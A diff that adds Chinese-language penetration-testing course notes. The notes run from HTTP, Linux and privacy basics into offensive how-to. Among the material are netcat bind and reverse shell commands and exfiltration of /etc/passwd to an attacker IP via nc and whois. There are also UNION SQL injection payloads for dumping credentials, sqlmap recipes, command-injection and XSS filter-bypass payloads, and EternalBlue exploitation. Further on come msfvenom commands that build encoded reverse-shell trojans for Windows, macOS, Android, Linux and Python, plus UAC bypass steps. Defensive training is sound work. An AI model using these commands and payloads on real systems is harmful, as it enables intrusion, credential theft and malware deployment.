@@ -1,0 +1,803 @@
+DAY01
+
+网络安全行业及周边介绍
+
+请求：
+>>>>
+GET：
+$a = $_GET['name'];
+$b = $_GET['age'];
+echo $a."--".$b;
+
+$a = $_GET['name'];
+$b = $_GET['age'];
+
+if($b>18)
+{
+	echo 'chengnian'.$a;
+}else{
+	echo 'weichengnian'.#a;
+}
+
+>>>>
+POST:
+$a = $POST['name'];
+>>>>
+
+POST多用在用户名密码注册，登录时使用
+GET多用于取东西
+>>>>
+web常见术语：
+GET：通过地址栏，从服务器拿东西
+回车之后，会以GET的方式读取一下当前的地址，刷新之后再次提交数据到当前界面
+
+刷新：从浏览器取王爷的新内容来更新本地缓存，更新的同时保留一些本地变量
+
+跳转：在地址栏输入新的地址，不会更新本地的缓存和变量
+
+www：world wide web 万维网
+web：客户端、服务器
+web客户端：浏览器web browser
+浏览器：可以访问网页服务器的web系统，查看html文件（IE,edge,chorme,firefox,opera,safari)
+request：向服务器发送一个请求，服务器会发挥一个结果给客户端
+forward：服务器内部发生重定向
+redirect：服务器收到请求后发送一个状态给客户，客户会再次请求，此时url发生了改变
+
+例：
+url:
+统一资源定位器
+http://www.baidu.com/index.php
+协议        域名          文件
+https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=12306
+s = 文件
+? = get请求
+ie = 参数名
+utf-8 = 参数值
+& = 连接符
+>>>>
+http超文本传输协议：
+所有的www文件都支持这个标准
+http是基于tcp/ip传输的
+web服务器（中间件）：apache iis nginx tomcat……
+web服务器收到一个请求，会向客户发送相应的消息
+http是无连接的：限制每一次的连接请求，每一次一个请求，服务器收到请求之后完成应答，断开连接，节省传输时间
+http是媒体独立的：只要客户端、服务器都知道这个数据是干嘛的，就可以使用http传输
+http是无状态的：无状态就是没有记忆能力，如果中途中断了，就需要重传
+>>>>
+http状态码：
+200 成功 | 301 网页被永久转向了其他的url | 404 请求的资源不存在 | 500 服务器内部错误
+响应头类型：
+Content-Type = 文档类型
+Content-Length = 传过来的内容长度
+Expires = 什么时候文档过期，不在缓存它
+Last-Modified = 最后修改时间
+refresh = 浏览器多长时间后刷新该文档
+server = 服务器名字
+set-cookie = 是否需要cookie支持
+>>>>
+
+http代理：拦截http请求的代理
+socks代理：拦截socks请求
+
+++++++++++
+
+操作系统及公网服务器部署
+
+vps（虚拟服务器）
+虚拟化，云计算/最开始的时候，一台服务器推荐只安装一个角色（service）/
+>>>>
+租vps
+分配一个IP地址，连接此台服务器 Windows远程桌面连接（用户名administrator）
+linux ssh连接（用户名root）////建议使用bitvise连接
+>>>>
+
+linux部分命令：
+ifconfig：查看IP地址
+whoami：查看自己使用的是什么用户
+
+>>>>
+
+安装一个网站管理系统
+如：宝塔面板
+yum install -y wget && wget -O install.sh http://download.bt.cn/install/install_6.0.sh && sh install.sh
+
+进入之后安装LAMP组合/注册一个域名，让域名指向自己的服务器的ip地址
+在宝塔面板里面给自己的网站安装一个ssl，这样网站会变成https
+>>>>
+选择vps的时候，有的vps厂商会让用户选择路线
+CN2中国下一代承载网，子好吃qos，比传统的163路线强
+CN2GT便宜但线路拥堵
+CN2GIA较贵，但质量更好
+BGP多线机房，自动识别运营商，不同网络自动切换
+GCP谷歌公司的线路，贵，但质量好
+AWS亚马逊路线，流量太少
+Azure微软线路，慢，中档
+PCCW香港线路，贵，网络发达
+IPLC国际私有租用线路（专线），极贵，带宽小流量低，不用翻墙直接墙外，不会通过GFW审查
+
++++++++++++
+
+踪迹隐藏以及加密通信了解
+
+个人防护，加密通信
+网站/注册域名
+njhack123.com
+
+域名指向ip地址
+www A ip地址
+ping www.njhack123.com
+
+@ A ip地址
+ping njhack123.com
+>>>>
+CDN
+cloudflare免费cdn
+防御ip地址本尊被发现
+流量缓存
+>>>>
+个人泄露：
+==
+网络方面：
+大部分人都会暴露自己的公网ip
+暴露ip就会暴露通信内容
+加密（vpn）
+==
+个人软件方面：
+IM
+qq,wx
+某些软件后台自动上传你电脑的文件到服务器
+某些杀毒软件：可以名正言顺对你电脑进行扫描，搜集信息
+某些国产浏览器
+(chrome firefox safari)
+记得退出清理痕迹
+输入法
+==
+个人电脑方面：
+你自己操作系统（盗版）
+邮件客户端 outlook exchange foxmail.....
+（多用虚拟机！！！！！）
+==
+网络通信：
+SMS--->2G = 不加密（3-5G加密）
+伪基站
+Tor洋葱路由器
+>>>>
+
+硬盘存储原理
+覆盖才是真正的忘记
+机械硬盘理论上覆盖3次才能彻底忘记
+固态硬盘直接覆盖就没了
+>>>>
+最牛逼的加密：
+pgp加密
+https://www.gnupg.org/download/index.html
+公钥(public key)加密，私钥(private key)解密
+公钥可以随便在互联网上传输
+（私钥一定不能泄露）
+如果pc2想发送一条只有pc1才可以看的文字，那么pc2需要导入pc1的公钥
+如果要pc1和pc2双向通信，必须两边都拥有对方的公钥
+>>>>
+EFS文件加密：
+只能windows使用
+证书加密（也非常安全）
+你的磁盘必须为NTFS格式才可以使用EFS文件加密
+>>>>
+
+++++++++++
+
+渗透测试系统的了解
+
+入侵类操作系统
+kali/linux
+install安装
+live光盘启动
+iso光盘镜像
+live方式启动，一切行为都是在内存里的/断电消失
+>>>>
+linux权限
+kali2020
+用户名密码kali
+kali2019以下
+root toor
+>>>>
+$ 普通用户权限
+sudo su 提权到root权限命令
+# root权限（机器&人类可用最高权限）
+ifconfig 查看ip地址
+whoami 查看自己是谁
+pwd 查看当前所在目录
+cd .. 退一格（在linux的世界里/是最上层目录）
+ls 查看当前目录
+ls -la 查看详细信息
+d r-x r-x r-x  13 root root 0 Nov 3 11:22 sys
+   A   B   C       D    E                 F
+
+d 文件夹
+- 文件
+l 链接
+//权限数字
+r=read=4 w=write=2 x=execute=1
+A=所有者权限
+B=所有者所在组权限
+C=其他人权限
+D=所有人
+E=所有人所在的组
+F=文件名
+rwxr-xr-x
+755
+mkdir test 新建文件夹,名字叫test
+touch 1.txt 新建文件1.txt
+vi 1.txt 使用vi编辑东西
+vi是一个命令行编辑器
+按下i进入insert模式
+esc---:wq 保存退出 :q! 不保存退出
+cat 1.txt 看一下1.txt内容
+tac
+cp [被复制的人] [复制的位置] 复制
+mv [被剪切的人] [目标位置] 剪切/改名
+rm [目标] 删除
+rm -rf [目标] 全部删除
+（rm -rf /* 危险命令）
+find [要在哪个地方查找] -name [查找的文件名]  找东西
+ps 查看进程
+ps -ef 查看所有进程
+top 看进程
+ctrl+c 结束
+ps -ef | grep [条件] 筛选符合条件的进程
+ps -ef | grep bash 在所有进程里面查看名字叫bash的
+| = 叫管道符,把左边命令执行的结果给右边
+echo 回显
+echo haha > 1.txt 在1.txt里写入haha（覆盖）
+echo haha >> 1.txt 追加
+uname 查看操作系统
+uname -a 查看详细信息
+chmod [权限数字] [目标文件] 修改权限
+chmod 755 -R [文件夹] 修改文件夹内所有东西的权限
+防火墙
+service iptables start/stop
+永久关闭
+chkconfig iptables on/off
+passwd 修改密码
+>>>>
+
+配置ssh
+vi /etc/ssh/sshd_config 修改ssh
+修改完后
+systemctl restart ssh/sshd 重启ssh（新版）
+/etc/init.d/ssh restart（旧版）
+之后使用bitvise连接
+>>>>
+修改更新源
+linux下载东西从哪下载
+/etc/apt/sources.list
+deb 
+http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 
+deb-src 
+http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+apt-get update 更新
+>>>>
+
+安装beef
+apt-get install beef-xss 
+>>>>
+
+黑客的最终目标是控制目标电脑的cmd/powershell
+微软觉得cmd权限和可以做的事太少了
+nc（瑞士军刀）
+开源
+>>>>
+普通发送文字
+服务端：
+nc -l -p 4444
+客户端：
+nc -nv [服务端ip] 4444
+>>>>
+远程控制：
+正向控制：
+目标：nc -lp 3333 -e cmd
+黑客：nc -nv [目标Ip] 3333
+反向控制：
+黑客：nc -lp 3333
+目标：nc -nv [黑客ip] 3333 -e cmd
+(如果是linux -c bash)
+
+>>>>
+
+nmap全世界最厉害的扫描器
+主机发现/端口扫描/版本侦测/操作系统指纹识别
+
+nmap [目标ip] 普通扫描
+-sT tcp扫描，普通扫描
+-sS 隐秘扫描(不形成三次握手)，不建立tcp连接，所以不会在防火墙上留下痕迹
+-sL [考虑扫一个段] list scan列表扫描，主要用于主机发现
+-sn ping scan（ping扫描）只发现主机不扫描端口
+-Pn 将所有主机都假定为开机，跳过主机发现过程
+-P0 使用ip协议探测主机是否开启
+-sU 使用udp扫描
+-p [指定扫描哪些端口]
+-O 识别操作系统
+
+++++++++++
+
+信息搜集工具的使用
+
+信息搜集：本地信息搜集：
+whoami 查看自己身份
+whoami /all 获取当前域的信息
+ipconfig /all 查看详细ip信息
+arp -a 查看arp表
+systeminfo 查看操作系统信息
+echo %PROCESSOR_ARCHITECTURE% 查看cpu型号
+wmic product get name,version 查看安装软件和版本信息
+wmic qfe get Caption,Description,HotFixID,InstalledOn 查看补丁列表
+net user 查看本地用户
+net session 显示本地和远程的会话
+wmic process list brief 查看进程
+net view 查看内网的共享
+>>>>
+远程信息搜集：
+网站
+http://seo.chinaz.com/
+http://whois.chinaz.com/
+活跃主机识别：
+nmap -sP [网段]
+nping -tcp -p 445 -data [十六进制数据] [目标ip] 对目标ip的445端口，以tcp的方式发送一串十六进制数据
+（可以通过以上方法模拟常见网络攻击，可以测试对方的防御效果）
+zenmap就是nmap的图形界面版本
+nmap -sV [目标ip] 服务指纹识别
+amap -bq [目标ip] [端口] 服务枚举
+nc -nvz [ip] 1-65535 使用nc进行扫描
+>>>>
+kali加密传输
+目标：
+cat /etc/passwd | base64 | nc -nv [黑客ip] 3333 -q 1
+黑客：
+nc -l -p 3333 > kali.txt
+>>>>
+传输文件
+目标：
+nc -nv [黑客ip] 3333 < [要传的文件] -q 1
+黑客:
+nc -lp 3333 > xx.txt
+>>>>
+远程克隆linux硬盘：
+黑客：
+nc -lp 3333 | dd of=/dev/sda
+目标：
+dd if=/dev/sda | nc -nv [黑客ip] 3333 -q 1
+>>>>
+适用于传输小的文件，whois也可以用于payload反弹
+
+目标
+whois -h [黑客ip] -p 4444 `cat /etc/passwd | base64`
+
+自己
+nc -l -v -p 4444 | sed "s/ //g" | base64 -d
+>>>>
+nc加密版ncat
+ncat大多数情况在nmap的工具包里
+目标(linux如果是windows系统，bash改成cmd)：
+ncat -c bash --allow [黑客ip] -vnl 3333 --ssl 只允许黑客的ip使用加密去控制它
+黑客：
+ncat -nv [目标ip] 3333 --ssl
+>>>>
+域环境：
+AD（active directiory）活动目录服务器
+>>>
+https://www.cnblogs.com/cnjavahome/p/9029665.html
+
+++++++++++
+
+漏洞扫描原理
+
+<?php$servername = "localhost";
+$username = "root";
+$password = "root";
+$dbname = "haha";//数据库名
+
+// 创建连接
+$conn = new mysqli($servername, $username, $password, $dbname);
+
+// 检测连接
+if ($conn->connect_error) {
+    die("连接失败: " . $conn->connect_error);
+}
+/*
+//数据库的查语句
+//准备一条数据库语句（sql语句）
+$sql = "SELECT * FROM table1 WHERE id < 3";
+//执行sql语句并且返回给变量$result
+$result = $conn->query($sql);
+
+//判断result里是否有东西
+if ($result->num_rows > 0) {
+    // 输出数据
+    while($row = $result->fetch_assoc()) {
+        echo $row['id'].'----->'.$row['username'].'------'.$row['password']."<br/>";
+    }
+} else {
+    echo "0 结果";
+}
+*/
+//数据库的增语句
+/*
+$sql = "INSERT INTO table1 (id, username, password)
+VALUES (10,'test2','haha22222')";
+
+if ($conn->query($sql) === TRUE) {
+    echo "新记录插入成功";
+} else {
+    echo "Error: " . $sql . "<br>" . $conn->error;
+}
+*/
+//数据库的修改语句
+/*
+$sql = "UPDATE table1 SET password='test55555'
+WHERE username='test5'";
+
+if ($conn->query($sql) === TRUE) {
+    echo "数据修改成功";
+} else {
+    echo "Error: " . $sql . "<br>" . $conn->error;
+}
+*/
+//数据库的删除语句
+$sql = "DELETE FROM table1 WHERE username='test2'";
+
+if ($conn->query($sql) === TRUE) {
+    echo "数据删除成功";
+} else {
+    echo "Error: " . $sql . "<br>" . $conn->error;
+}
+$conn->close();
+?>
+>>>>
+<html>
+<head>
+  <title>this is php test haha</title>
+</head>
+<body>
+<?php
+$servername = "localhost";
+$username = "root";
+$password = "root";
+$dbname = "haha";//数据库名
+
+// 创建连接
+$conn = new mysqli($servername, $username, $password, $dbname);
+
+// 检测连接
+if ($conn->connect_error) {
+    die("连接失败: " . $conn->connect_error);
+}
+//数据库的查语句
+//准备一条数据库语句（sql语句）
+$sql = "SELECT * FROM table1 WHERE id < 12 LIMIT 0,1";
+//执行sql语句并且返回给变量$result
+$result = $conn->query($sql);
+
+//判断result里是否有东西
+if ($result->num_rows > 0) {
+    // 输出数据
+echo "<table border='1'>";
+echo "<tr><th>id</th> <th>username</th> </tr>";
+    while($row = $result->fetch_assoc()) {
+
+echo "<tr>";
+echo "<td>".$row['id']."</td>";
+echo "<td>".$row['username']."</td>";
+echo "</tr>";
+
+    }
+echo "</table>";
+}
+$conn->close();
+?>
+</body>
+</html>
+>>>>
+php
+GET POST
+php+mysql
+>>>>
+库名---一张张表---一列列---数据
+数据库操作类型：
+增删改查
+>>>>
+漏洞为什么会出现？
+因为和用户有互动
+因为需要调用后端的逻辑代码，甚至需要调用数据库或者操作系统命令
+>>>>
+最基本的SQL注入攻击手法：
+http://sqlilabs.njhack.xyz/
+http://sqlilabs.njhack.xyz/Less-1/
+估算目标的数据库语法
+select username,password from tablex where id=' 2\  ' limit 0,1
+黑客需要破坏数据库语句
+目的是为了知道数据库的闭合方式
+这个世界上所有的闭合方式' " () ('x') (('x')) ("x") (("x")) (()) 没有任何闭合方式的
+id=2'
+''2'' LIMIT 0,1'
+'2'' LIMIT 0,1
+\ = 转义字符，把后面的一个东西变成字符串
+select username,password from tablex where id=' 2\' limit 0,1
+会导致闭合失败，从而报错，爆出闭合的内容
+所以知道了闭合方式是'闭合
+数据库注释符
+--
+/**/
+#
++ 相当于空格
+select username,password from tablex where id=' 2' --+ ' limit 0,1
+select username,password from tablex where id=' 2'
+确定有多少个栏目
+id=2' order by [数字] --+
+select id,username,password from tablex where id=' 2' order by 10 --+
+发现order by 3正常
+说明他数据库里有3个栏目
+显示报错位
+select id,username,password from tablex where id=' -2' union select 1,2,3 --+ ' limit 0,1
+id=-2' union select 1,2,3 --+
+发现报错位是2,3
+查看数据库的库名
+id=-2' union select 1,database(),3 --+
+库名是security
+根据库名找到表名
+id=-2' union select 1,table_name,3 from information_schema.tables where table_schema = 'security' limit 0,1 --+
+查到表名emails，referers，uagents，users
+黑客觉得users里面的数据很有价值
+id=-2' union select 1,column_name,3 from information_schema.columns where table_schema = 'security' and table_name = 'users' limit 0,1 --+
+发现users里有id，username，password
+黑客需要拿到所有的username和password的值
+id=-2' union select 1,group_concat(username),group_concat(password) from users  --+
+>>>>
+用命令行操作数据库
+mysql -u用户名 -p密码
+show databases; 看到所有数据库的库名
+use [库名]; 进入某个数据库
+show tables; 查看数据库有多少表
+select * from [表名]; 查看表中所有内容
+select * from table1 where id < 13 limit 1,2;
+select 1,2,3,4,5;
+union 联合查询（limit会坏好事）
+select * from table1 where id < 13 union select 1,2,3;
+
+++++++++++
+
+SQL注入原理攻击方法
+
+安全工具的使用：
+windows+iis+asp/aspx(asp.net)+access/mssql
+windows+apache+php+mysql= wamp（一般使用软件进行集成化搭建）
+linux+apache/nginx+php+mysql = lamp/lnmp（有可能使用宝塔或者其他面板搭建）
+linux+tomcat+java(jsp)+oracle/mysql
+linux+nginx+python(django/flask)+mysql
+>>>>
+# pangolin（穿山甲）
+# havij (萝卜头)
+>>>>
+sqlmap（sql注入神器）
+sqlmap的标准用法：
+sqlmap -u [目标url] --dbs
+获取目标网站的库名
+发现security库
+sqlmap -u [目标url] -D security --tables
+获取库里的表
+发现users表的列
+sqlmap -u [目标url] -D security -T users --columns
+发现id username password
+找到id,username,password的内容
+sqlmap -u [目标url] -D security -T users -C username,password --dump
+完整版命令：
+sqlmap -u [目标url] --dbs --batch --threads 10 --technique U
+使用sqlmap的10线程，忽略错误，使用union select注入目标网站
+>>>>
+无法发现报错位，但是数据库出错会爆出来
+报错注入：
+(error based)
+sqlmap -u [目标url] --current-db --batch --threads 10 --technique E
+使用报错注入
+>>>>
+无法发现报错位，数据库被破坏也无法爆出来，但是界面上只会出现有和没有东西两种情况
+布尔型注入：
+(booled based)
+sqlmap -u [目标url] --current-db --batch --threads 10 --technique B
+>>>>
+无法发现报错位，数据库被破坏也无法爆出来，界面也没有出现或者消失东西的现象
+布尔型时间盲注：
+(time based)
+sqlmap -u [目标url] --current-db --batch --threads 10 --technique T -v 3
+>>>>
+post方面注入：
+$uname = $_POST['uname'];
+$passwd = $_POST['password'];
+select username,password from users where username='$uname' and password='$passwd' limit 0,1
+sqlmap -u http://sqlilabs.njhack.xyz/Less-11/ --data "uname=admin*&passwd=admin&submit=Submit" --current-db --batch --threads 10 --technique E
+--data 后面跟的是post的数据
+*号标哪，就是让sqlmap打哪
+>>>>
+有的网站可能会搜集用户的浏览器信息：
+请求头注入：
+ip地址，user-agent（浏览器信息）,referer（来路）,cookie
+sqlmap -u http://sqlilabs.njhack.xyz/Less-18/ --user-agent="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0*" --level 4 --dbs --threads 10 --batch --technique E
+在使用请求头注入的时候，--level必须大于3
+sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie="uname = admin*;__cfduid=dab97c3dd6a54c5ca485d3e880af5ce271605180690" --level 4 --dbs --threads 10 --batch --technique E
+
+++++++++++
+
+其他web漏洞介绍
+
+http://dvwa.njhack.xyz/login.php默认用户名
+admin
+password
+#######
+蓝奏云地址
+https://njeclissi.lanzoui.com/b01bfj0pc
+密码:6k6a
+>>>>
+如果安装了java，cmd输入java可以执行，但是burp还是打不开
+新建一个bat文件
+java -jar BurpUnlimited.jar
+>>>>
+Brute Force
+暴力破解
+可以仔细观察密码输入错误和正确的页面返回大小是不一样的
+使用burp抓包，send to intruder，调整相应参数后
+sinper模式
+单向爆破
+用途：你知道用户名不知道密码，破解一些单一输入框
+battering ram模式：
+并发攻击，对多个目标进行单一的payload攻击
+也就是用户名和密码一样的情况（工号，学号）
+pitchform模式：
+交叉攻击（撞库）
+有几个变量就可以选择几个字典，在这几个字典里随机抽出来尝试密码
+cluster bomb模式：
+穷举模式
+完整的爆破
+>>>>
+验证码？
+1.使用打码平台
+2.人工智能（机器学习，深度学习，神经网络）
+>>>>
+Command Injection（命令执行漏洞）
+一个地方可以执行操作系统的命令
+ping 127.0.0.1&cat /etc/passwd 几乎同时执行
+ping 127.0.0.1&&cat /etc/passwd 执行完左边执行右边
+ping 127.0.0.1|cat /etc/passwd 只执行右边的命令
+>>>>
+SQL Injection（sql注入攻击）
+medium
+POST提交
+burp抓包
+右键-send to repeater
+>>>>
+Stored Cross Site Scripting (XSS)存储型跨站脚本攻击
+haha<script>alert('nihao')</script>
+替换了<script>为空
+转义了' "
+haha<scr<script>ipt>alert(1)</script>
+前端代码是不识别script标签大小写的
+haha<scRiPt>alert(1)</sCRipt>
+图片无法加载也可以触发js
+<img src='x' onerror='alert(1)'/>
+配合神器使用
+>>>>
+Weak Session IDs
+脆弱的session id
+有的网站用户登录之后会给一个session id作为用户的标识符，如果你知道其他人的session id，并且伪造，就有可能不通过用户名密码登录对方的帐号
+>>>>
+CSP Bypass
+浏览器安全策略
+对xss有防护作用的
+只允许执行某些网站的东西，那你就到这个网站上想办法写一个js的地址
+https://pastebin.com/
+medium
+unsafe-inline 允许使用内联资源 javascript:xxx.com onclick style
+nonce-source 允许特定内联模块 nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="
+<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert('haha')</script>
+>>>>
+JavaScript Attacks
+js攻击
+攻击web前端安全
+需要知道token的算法是什么，看懂token算法的js代码，然后去推
+low
+在控制台输入
+md5(rot3("success"));
+得到token
+medium
+XXsuccessXX
+XXsseccusXX
+high
+解密特征混淆算法的网站
+http://deobfuscatejavascript.com/
+
+++++++++++
+
+MSF框架及其使用
+
+msf
+metasploit
+>>>>
+
+攻击框架
+msfconsole 打开msf
+可以调用nmap
+nmap -sV [目标ip]
+永恒之蓝 ms17_010
+msf如果去攻击对方需要条件：
+1.漏洞
+2.攻击载荷（木马，病毒）
+msf console
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS [目标ip]
+run 运行
+>>>>
+
+msf内网渗透：
+生成exe木马：
+msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=[自己ip] LPORT=4444 -b "\00" -e x86/shikata_ga_nai -f exe > msf.exe
+在msf里建立木马控制端：
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST [自己ip]
+exploit 进入监听状态
+此时如果有木马启动，就会连接我
+background 暂时不操作，把木马放到后台
+sessions 查看控制了多少人
+sessions -i 1 进入1号主机控制端
+jobs 查看目前在执行多少任务
+back 后退一格
+>>>>
+
+其他生成木马的命令：
+生成mac木马：
+msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=自己ip LPORT=4444 -f macho -o payload.macho
+生成android木马（需要数字签名）：
+msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f apk -o payload.apk
+生成powershell木马：
+msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=自己ip LPORT=4444 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1
+生成linux木马：
+msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f elf -o payload.elf
+生成python木马：
+msfvenom -p python/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f raw -o payload.py
+>>>>
+
+meterpreter操作：
+UAC提权：
+getuid 查看当前用户权限
+getsystem 直接提权
+（有风险，有可能会报错）
+考虑使用ask模块去提权
+background 先把木马放到后台
+use exploit/windows/local/ask 加载ask模块
+info 查看漏洞信息
+set SESSION 1 使用漏洞在1号木马控制的目标上
+set FILENAME qq.exe 伪装成qq
+exploit
+会在用户桌面上弹出一个允许qq启动，用户选择yes，成功
+getuid 发现还不是system
+getsystem 可以提高到最高
+>>>>
+
+UAC绕过提权（成功概率不高）：
+use exploit/windows/local/bypassuac (多用来进攻32位系统)
+show options
+set SESSION 1
+exploit 开始攻击
+如果攻击成功，会给你一个新的session号
+进入新的session号
+getuid
+getsystem
+>>>>
+几个比较有用的入侵程序（？）
+https://github.com/Screetsec/TheFatRat
+
+https://github.com/M4sc3r4n0/Evil-Droid
+
+https://github.com/jbreed/apkinjector
+>>>>
+木马免杀实验网站
+VirunsTotal.com
